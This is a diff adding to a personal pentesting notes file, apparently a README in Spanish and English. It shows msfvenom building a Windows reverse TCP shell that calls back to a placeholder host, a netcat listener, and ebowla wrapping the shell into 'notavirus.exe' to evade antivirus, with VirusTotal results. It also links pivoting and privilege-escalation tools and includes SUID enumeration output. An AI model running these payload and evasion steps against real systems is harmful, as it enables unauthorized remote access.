@@ -49,13 +49,229 @@ For simplicity, I only run the core commands.
 
     # Podemos usar netcat en conjuncion con otra herramienta, rlwrap. 
     
+    https://github.com/hanslub42/rlwrap
+    
     # It  returns a standard netcat listener on port 4444. 
     # However, your shell will be improved with added benefit of allowing you to cycle between used  commands by using your Up-Arrow and Down-Arrow         keys.
     
     > rlwrap -cAr nc -nvlp 4444
     listening on [any] 4444 ...
-
     
+    # creating a windows tcp shell tcp reverse on port 4444, use your ip address.
+    > msfvenom -p windows/x64/shell_reverse_tcp LHOST=X.Y.Z.W  LPORT=4444 -f exe -a x64 -o shell.exe
+    [?] Would you like to init the webservice? (Not Required) [no]: no
+    Clearing http web data service credentials in msfconsole
+    Running the 'init' command for the database:
+    Existing database found, attempting to start it
+    Starting database at /home/kali/.msf4/db...success
+    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+    No encoder specified, outputting raw payload
+    Payload size: 460 bytes
+    Final size of exe file: 7168 bytes
+    Saved as: shell.exe
+    > ls -ltah shell.exe
+    -rw-r--r-- 1 kali kali 7.0K Aug  5 11:59 shell.exe
+
+# 3bowla
+    
+    Using the previous shell.exe process created with msfvenom...
+    
+    A python3 version of the Antivirus (AV) evasion framework ebowla.
+
+    > sudo python3 ebowla.py shell.exe genetic.config
+    Overall : {'Encryption_Type': 'ENV', 'output_type': 'GO', 'minus_bytes': '1', 'payload_type': 'EXE', 'key_iterations': '10000', 'clean_output': 'False'}
+    otp_settings : {'otp_type': 'key', 'pad': 'cmd.exe', 'pad_max': '0xffffff', 'scan_dir': 'c:\\windows\\sysnative', 'byte_width': '9'}
+    symmetric_settings_win : {'ENV_VAR': {'username': 'Administrator', 'computername': '', 'homepath': '', 'homedrive': '', 'Number_of_processors': '', 'processor_identifier': '', 'processor_revision': '', 'userdomain': '', 'systemdrive': '', 'userprofile': '', 'path': '', 'temp': ''}, 'PATH': {'path': '', 'start_loc': '%HOMEPATH%'}, 'IP_RANGES': {'external_ip_mask': ''}, 'SYSTEM_TIME': {'Time_Range': ''}}
+    [*] Using Symmetric encryption
+    [*] Payload length 7168
+    [*] Payload_type exe
+    [*] Using EXE payload template
+    [*] Used environment variables:
+            [-] environment value used: username, value used: administrator
+    [*] Path string used as part of key: b''
+    [!] External IP mask NOT used as part of key
+    [!] System time mask NOT used as part of key
+    [*] String used to source the encryption key: b'administrator'
+    [*] Applying 10000 sha512 hash iterations before encryption
+    [*] Encryption key is: d7f740196206d2a46b638ccc3aecceb1d47326d06a1870f9b9fe98f20ca2155b
+    [*] Writing GO payload to: go_symmetric_shell.exe.go
+    
+    > ls
+    build_x64_go.sh  build_x86_go.sh  cleanup.py  documentation.md  ebowla.py  encryption  genetic.config  LICENSE.md  MemoryModule  output  __pycache__  README.md  shell.exe  templates  test
+    > find . -name go_symmetric_shell.exe.go
+    ./output/go_symmetric_shell.exe.go
+    
+    > ls ./output
+    go_symmetric_shell.exe.go
+    
+    > ls output
+    go_symmetric_shell.exe.go
+    > ./build_x64_go.sh output/go_symmetric_shell.exe.go notavirus.exe
+    [*] Copy Files to tmp for building
+    [*] Building...
+    [*] Building complete
+    [*] Copy notavirus.exe to output
+    cp: cannot create regular file './output/notavirus.exe': Permission denied
+    [*] Cleaning up
+    [*] Done
+    
+    # ups, cannot create the file.
+    
+    > sudo ./build_x64_go.sh output/go_symmetric_shell.exe.go notavirus.exe
+    [*] Copy Files to tmp for building
+    [*] Building...
+    [*] Building complete
+    [*] Copy notavirus.exe to output
+    [*] Cleaning up
+    [*] Done
+    > ls output
+    go_symmetric_shell.exe.go  notavirus.exe
+
+# Finally i have a tcp shell reverse for windows x64, in order to be used with my ip and some port...
+# Lets check results:
+
+    shell.exe:
+    
+    https://www.virustotal.com/gui/file/785cc759b3ec0cf003bbeb45796eba3f63cdf613bd03bb18dd96bf49fffd5aa5?nocache=1
+    
+    notavirus.exe
+    
+    https://www.virustotal.com/gui/file/0fbc4800d9f5f6672e2f4fb6b250831e4ea8c4361a27c531b92c608ca1d90d01?nocache=1
+    
+    conclusion, notavirus is still marked as suspicious in virustotal...
+    
+# Port forwarding or pivoting with a SOCKS proxy.
+
+    chisel
+
+    A fast TCP/UDP tunnel, transported over HTTP, secured via SSH. This tool can be used for port forwarding or pivoting with a SOCKS proxy.
+    
+    https://github.com/jpillora/chisel
+    
+# Flameshot
+
+    sudo apt install flameshot
+    
+# Escalada de privilegios linux, Osx y windows
+
+    https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+    
+    https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
+    
+# Enumerar ficheros creados con SUID. TODO, algo tengo que hacer porque este script ha detectado cosas sospechosas...
+
+    https://www.compuhoy.com/que-es-suid-en-linux/
+    
+    Description
+
+    A standalone script supporting both python2 & python3 to find out all SUID binaries in machines/CTFs and do the following
+
+    List all Default SUID Binaries (which ship with linux/aren't exploitable)
+    List all Custom Binaries (which don't ship with packages/vanilla installation)
+    List all custom binaries found in GTFO Bin's (This is where things get interesting)
+    Printing binaries and their exploitation (in case they create files on the machine)
+    Try and exploit found custom SUID binaries which won't impact machine's files
+
+    https://github.com/Anon-Exploiter/SUID3NUM
+    
+    > python suid3num.py
+      ___ _   _ _ ___    _____  _ _   _ __  __ 
+     / __| | | / |   \  |__ / \| | | | |  \/  |
+     \__ \ |_| | | |) |  |_ \ .` | |_| | |\/| |
+     |___/\___/|_|___/  |___/_|\_|\___/|_|  |_|  twitter@syed__umar
+
+    [#] Finding/Listing all SUID Binaries ..
+    ------------------------------
+    /opt/google/chrome/chrome-sandbox
+    /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                               
+    /usr/lib/openssh/ssh-keysign                                                                                                                                                                              
+    /usr/lib/xorg/Xorg.wrap                                                                                                                                                                                   
+    /usr/lib/chromium/chrome-sandbox                                                                                                                                                                          
+    /usr/bin/kismet_cap_linux_bluetooth                                                                                                                                                                       
+    /usr/bin/vmware-user-suid-wrapper                                                                                                                                                                         
+    /usr/bin/gpasswd                                                                                                                                                                                          
+    /usr/bin/su                                                                                                                                                                                               
+    /usr/bin/kismet_cap_ti_cc_2531                                                                                                                                                                            
+    /usr/bin/ntfs-3g                                                                                                                                                                                          
+    /usr/bin/pkexec                                                                                                                                                                                           
+    /usr/bin/chsh                                                                                                                                                                                             
+    /usr/bin/chfn                                                                                                                                                                                             
+    /usr/bin/kismet_cap_nrf_mousejack                                                                                                                                                                         
+    /usr/bin/ksu                                                                                                                                                                                              
+    /usr/bin/sudo                                                                                                                                                                                             
+    /usr/bin/kismet_cap_nrf_51822                                                                                                                                                                             
+    /usr/bin/kismet_cap_ti_cc_2540                                                                                                                                                                            
+    /usr/bin/passwd                                                                                                                                                                                           
+    /usr/bin/kismet_cap_linux_wifi                                                                                                                                                                            
+    /usr/bin/kismet_cap_nxp_kw41z                                                                                                                                                                             
+    /usr/bin/kismet_cap_rz_killerbee                                                                                                                                                                          
+    /usr/bin/kismet_cap_nrf_52840                                                                                                                                                                             
+    /usr/bin/mount                                                                                                                                                                                            
+    /usr/bin/kismet_cap_ubertooth_one                                                                                                                                                                         
+    /usr/bin/newgrp                                                                                                                                                                                           
+    /usr/bin/umount                                                                                                                                                                                           
+    /usr/bin/fusermount3                                                                                                                                                                                      
+    /usr/share/atom/chrome-sandbox                                                                                                                                                                            
+    /usr/share/discord-canary/chrome-sandbox                                                                                                                                                                  
+    /usr/libexec/polkit-agent-helper-1                                                                                                                                                                        
+    /usr/sbin/mount.nfs                                                                                                                                                                                       
+    /usr/sbin/mount.cifs                                                                                                                                                                                      
+    /usr/sbin/pppd                                                                                                                                                                                            
+    /usr/sbin/exim4                                                                                                                                                                                           
+    ------------------------------                                                                                                                                                                            
+
+
+    [!] Default Binaries (Don't bother)                                                                                                                                                                       
+    ------------------------------                                                                                                                                                                            
+    /opt/google/chrome/chrome-sandbox                                                                                                                                                                         
+    /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                               
+    /usr/lib/openssh/ssh-keysign                                                                                                                                                                              
+    /usr/lib/xorg/Xorg.wrap                                                                                                                                                                                   
+    /usr/lib/chromium/chrome-sandbox                                                                                                                                                                          
+    /usr/bin/vmware-user-suid-wrapper                                                                                                                                                                         
+    /usr/bin/gpasswd                                                                                                                                                                                          
+    /usr/bin/su                                                                                                                                                                                               
+    /usr/bin/ntfs-3g                                                                                                                                                                                          
+    /usr/bin/pkexec                                                                                                                                                                                           
+    /usr/bin/chsh                                                                                                                                                                                             
+    /usr/bin/chfn                                                                                                                                                                                             
+    /usr/bin/sudo                                                                                                                                                                                             
+    /usr/bin/passwd                                                                                                                                                                                           
+    /usr/bin/mount                                                                                                                                                                                            
+    /usr/bin/newgrp                                                                                                                                                                                           
+    /usr/bin/umount                                                                                                                                                                                           
+    /usr/share/atom/chrome-sandbox                                                                                                                                                                            
+    /usr/share/discord-canary/chrome-sandbox                                                                                                                                                                  
+    /usr/libexec/polkit-agent-helper-1                                                                                                                                                                        
+    /usr/sbin/mount.nfs                                                                                                                                                                                       
+    /usr/sbin/mount.cifs                                                                                                                                                                                      
+    /usr/sbin/pppd                                                                                                                                                                                            
+    /usr/sbin/exim4                                                                                                                                                                                           
+    ------------------------------                                                                                                                                                                            
+
+
+    [~] Custom SUID Binaries (Interesting Stuff)                                                                                                                                                              
+    ------------------------------                                                                                                                                                                            
+    /usr/bin/kismet_cap_linux_bluetooth                                                                                                                                                                       
+    /usr/bin/kismet_cap_ti_cc_2531                                                                                                                                                                            
+    /usr/bin/kismet_cap_nrf_mousejack                                                                                                                                                                         
+    /usr/bin/ksu                                                                                                                                                                                              
+    /usr/bin/kismet_cap_nrf_51822                                                                                                                                                                             
+    /usr/bin/kismet_cap_ti_cc_2540                                                                                                                                                                            
+    /usr/bin/kismet_cap_linux_wifi                                                                                                                                                                            
+    /usr/bin/kismet_cap_nxp_kw41z                                                                                                                                                                             
+    /usr/bin/kismet_cap_rz_killerbee                                                                                                                                                                          
+    /usr/bin/kismet_cap_nrf_52840                                                                                                                                                                             
+    /usr/bin/kismet_cap_ubertooth_one                                                                                                                                                                         
+    /usr/bin/fusermount3                                                                                                                                                                                      
+    ------------------------------                                                                                                                                                                            
+
+
+    [#] SUID Binaries found in GTFO bins..                                                                                                                                                                    
+    ------------------------------                                                                                                                                                                            
+    [!] None :(                                                                                                                                                                                               
+    ------------------------------                                                                                                                                                                            
+                                                                                                                                                                                                         
 # Wifi wardriving
 
     I modified a bit s4vitar`s version. I have an alfa awu0360h
